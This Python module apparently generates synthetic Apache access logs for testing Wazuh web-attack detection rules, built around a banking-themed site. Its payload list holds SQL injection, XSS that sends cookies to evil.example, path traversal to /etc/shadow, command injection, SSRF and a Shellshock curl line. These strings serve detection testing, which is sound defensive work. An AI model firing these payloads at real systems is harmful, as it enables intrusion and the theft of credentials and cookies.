"""
Web application log generator (Apache combined format).

The Wazuh apache-accesslog decoder + web-attack ruleset (31100/31500 series)
fires on:
  - SQL injection patterns         -> rule 31103
  - XSS attempts                   -> rule 31104
  - Path traversal / LFI           -> rule 31106
  - Common web scan tools (UA)     -> rule 31151
  - 4xx/5xx burst from one IP      -> rule 31151 chain
  - Login brute force on POST      -> rule 31108 + chain
  - Shellshock UA                  -> rule 31168

NEW: scenario attacker IPs from shared_state run the SQLi/XSS/login brute
attempts against banking-themed URLs (online banking, mobile API). Pivoting
on data.srcip will reveal the same attacker also brute-forcing SSH/AD/MSSQL.
"""
import random
from pathlib import Path
from datetime import timedelta
from .common import (
    INTERNAL_IPS, EXTERNAL_IPS, ATTACKER_IPS, USER_AGENTS,
    pick_normal_user, USERNAMES,
    rand_recent, apache_ts, pick,
)
from .shared_state import INCIDENTS


# Banking-themed URLs (internet banking + mobile API + admin)
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/products", "/contact",
    "/login", "/logout", "/dashboard",
    "/accounts", "/accounts/balance", "/accounts/transactions",
    "/transfer", "/transfer/internal", "/transfer/swift",
    "/cards", "/cards/statement",
    "/loans", "/loans/apply", "/loans/calculator",
    "/api/v1/users/me", "/api/v1/accounts/balance",
    "/api/v1/transactions?from=2026-04-01",
    "/api/v2/mobile/login", "/api/v2/mobile/biometric",
    "/static/css/app.css", "/static/js/bundle.js",
    "/static/img/logo.png", "/favicon.ico",
]

ADMIN_PATHS = [
    "/admin", "/admin/login", "/admin/users",
    "/manage/system", "/console",
]


ATTACK_PAYLOADS = {
    "sqli": [
        "/accounts?id=1' OR '1'='1",
        "/login?user=admin'--&pass=x",
        "/api/v1/transactions?id=1 UNION SELECT username,password FROM users--",
        "/loans?id=1; DROP TABLE applications--",
        "/index.php?id=1%27%20AND%20SLEEP%285%29--",
        "/api/v1/customers?filter=' OR 1=1 LIMIT 100 --",
    ],
    "xss": [
        "/search?q=<script>alert(1)</script>",
        "/comment?text=<img src=x onerror=fetch('//evil.example?'+document.cookie)>",
        "/profile?name=<svg/onload=alert(document.domain)>",
        "/transfer/note?txt=<iframe src=javascript:alert(1)>",
    ],
    "lfi": [
        "/download?file=../../../../etc/passwd",
        "/view?page=....//....//....//etc/shadow",
        "/static?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini",
        "/export?template=../../../../var/log/wazuh-agent/ossec.log",
    ],
    "rce": [
        "/api/exec?cmd=;cat /etc/passwd",
        "/cgi-bin/test.cgi?x=`id`",
        "/?search=%24%28id%29",
        "/api/v1/admin/exec?cmd=whoami",
    ],
    "ssrf": [
        "/proxy?url=http://169.254.169.254/latest/meta-data/",
        "/fetch?u=file:///etc/passwd",
        "/api/v1/preview?url=http://localhost:6379",
    ],
    "jwt_abuse": [
        "/api/v1/admin?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
        "/api/v2/account?token=eyJhbGciOiJIUzI1NiJ9.fake.signature",
    ],
    "deserialization": [
        "/api/v1/import?data=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D",
    ],
}


# =========================================================================
# Line builders
# =========================================================================
def _line(ip, ts, method, path, status, size, ua, referer="-", user="-"):
    return (f'{ip} - {user} {apache_ts(ts)} '
            f'"{method} {path} HTTP/1.1" {status} {size} '
            f'"{referer}" "{ua}"')


def _normal(ts):
    ip = pick(INTERNAL_IPS + EXTERNAL_IPS[:3])
    return _line(
        ip, ts, "GET", pick(NORMAL_PATHS),
        pick([200, 200, 200, 200, 301, 304, 404]),
        random.randint(200, 50000),
        pick(USER_AGENTS[:4]),
    )


def _normal_post(ts):
    """Legit POST (transfer, login)."""
    ip = pick(INTERNAL_IPS + EXTERNAL_IPS[:3])
    return _line(
        ip, ts, "POST",
        pick(["/login", "/transfer", "/api/v2/mobile/login"]),
        pick([200, 302, 200, 401]),
        random.randint(100, 1500),
        pick(USER_AGENTS[:4]),
        referer="https://ibank.bank.local/login",
    )


def _attack(ts, kind, ip=None):
    ip = ip or pick(ATTACKER_IPS)
    path = pick(ATTACK_PAYLOADS[kind])
    # Server typically returns 200 (vuln) or 403 (WAF) or 500 (error)
    status = pick([200, 403, 500])
    ua = pick(USER_AGENTS[4:9])   # curl / sqlmap / nikto / nmap / shellshock
    return _line(ip, ts, "GET", path, status, random.randint(100, 5000), ua)


def _login_bruteforce_line(ts, ip, username=None):
    """A failed POST /login attempt — repeated => brute force chain."""
    return _line(
        ip, ts, "POST", "/login",
        pick([401, 401, 401, 403]),
        random.randint(100, 800),
        pick(USER_AGENTS[4:7]),
        referer="https://ibank.bank.local/login",
        user=(username or "-"),
    )


def _login_success_line(ts, ip, username):
    """A successful login from same brute-forcer = compromise indicator."""
    return _line(
        ip, ts, "POST", "/login",
        302, random.randint(500, 1500),
        pick(USER_AGENTS[4:7]),
        referer="https://ibank.bank.local/login",
        user=username,
    )


def _scan_line(ts, ip):
    """Scanner activity: characteristic paths + scanner UA."""
    return _line(
        ip, ts, "GET",
        pick(["/wp-admin/", "/phpmyadmin/", "/.env", "/.git/config",
              "/admin/config.php", "/wp-login.php", "/server-status",
              "/console", "/jmx-console/", "/manager/html",
              "/api-docs", "/swagger-ui.html"]),
        pick([404, 403, 200, 401]),
        random.randint(0, 2000),
        pick(USER_AGENTS[6:9]),
    )


def _shellshock_line(ts, ip):
    """Shellshock-flavoured request — UA carries the payload."""
    return _line(
        ip, ts, "GET", "/cgi-bin/status",
        500, 0,
        '() { :; }; /bin/bash -c "curl http://evil.example/x"',
    )


def _high_value_action(ts, ip, username, path, status=200):
    """A logged-in user's high-value action (transfer, settings change)."""
    return _line(
        ip, ts, "POST", path, status,
        random.randint(200, 2000),
        pick(USER_AGENTS[:4]),
        referer="https://ibank.bank.local/dashboard",
        user=username,
    )


# =========================================================================
# Main generator
# =========================================================================
def generate(path: Path, count: int = 40) -> None:
    events = []

    # --- Baseline normal traffic --------------------------------------
    for _ in range(count * 2):
        ts = rand_recent(60)
        events.append((ts, _normal(ts)))
    for _ in range(count // 2):
        ts = rand_recent(60)
        events.append((ts, _normal_post(ts)))

    # ----------------------------------------------------------------
    # SCENARIO-DRIVEN: login brute force + attack chain per incident
    # ----------------------------------------------------------------
    for incident in INCIDENTS:
        attacker_ip = incident["attacker_ip"]
        victim_user = incident["victim_user"]

        # 1) Scanner phase: nikto/sqlmap-style probing across admin paths
        base = rand_recent(35)
        for i in range(10):
            ts = base + timedelta(seconds=i)
            events.append((ts, _scan_line(ts, attacker_ip)))

        # 2) Login brute force on /login (15-20 attempts, mix of accounts)
        login_base = base + timedelta(seconds=30)
        n_attempts = random.randint(15, 20)
        bf_users = ["admin", "administrator", victim_user, "test",
                    "support", victim_user]
        for i in range(n_attempts):
            ts = login_base + timedelta(seconds=i * 2)
            user = pick(bf_users)
            events.append((ts, _login_bruteforce_line(ts, attacker_ip, user)))

        # 3) Successful login as the victim
        ts = login_base + timedelta(seconds=n_attempts * 2 + 5)
        events.append((ts, _login_success_line(ts, attacker_ip, victim_user)))

        # 4) Post-login attack: SQLi against an authenticated endpoint
        ts = login_base + timedelta(seconds=n_attempts * 2 + 30)
        events.append((ts, _line(
            attacker_ip, ts, "GET",
            "/api/v1/accounts/balance?id=1' UNION SELECT card_number,cvv FROM cards--",
            500, 400,
            pick(USER_AGENTS[4:6]),
            user=victim_user)))

        # 5) High-value action — unauthorized transfer
        ts = login_base + timedelta(seconds=n_attempts * 2 + 60)
        events.append((ts, _high_value_action(
            ts, attacker_ip, victim_user,
            "/transfer/swift", status=200)))

        # 6) Possible privilege escalation attempt
        if incident["victim_priv"] in ("admin", "manager", "service"):
            ts = login_base + timedelta(seconds=n_attempts * 2 + 90)
            events.append((ts, _line(
                attacker_ip, ts, "GET", pick(ADMIN_PATHS),
                200, 5000, pick(USER_AGENTS[:4]),
                user=victim_user)))

    # ----------------------------------------------------------------
    # STANDALONE attacks (rule coverage even when scenarios miss web)
    # ----------------------------------------------------------------

    # Mix all attack categories from scattered attackers
    for kind in ATTACK_PAYLOADS.keys():
        for _ in range(3):
            ts = rand_recent(45)
            events.append((ts, _attack(ts, kind)))

    # Scanner runs from a third-party scanner IP (not part of scenarios)
    scanner_ip = pick(ATTACKER_IPS)
    scan_base = rand_recent(30)
    for i in range(10):
        ts = scan_base + timedelta(seconds=i)
        events.append((ts, _scan_line(ts, scanner_ip)))

    # Shellshock probes (rule 31168)
    for _ in range(3):
        ts = rand_recent(40)
        events.append((ts, _shellshock_line(ts, pick(ATTACKER_IPS))))

    events.sort(key=lambda x: x[0])
    with path.open("w", encoding="utf-8") as f:
        for _, line in events:
            f.write(line + "\n")

    print(f"  wrote {len(events)} web access events -> {path.name}")
    print(f"  scenario-driven web brute-force chains: {len(INCIDENTS)} "
          f"(attackers: {[i['attacker_ip'] for i in INCIDENTS]})")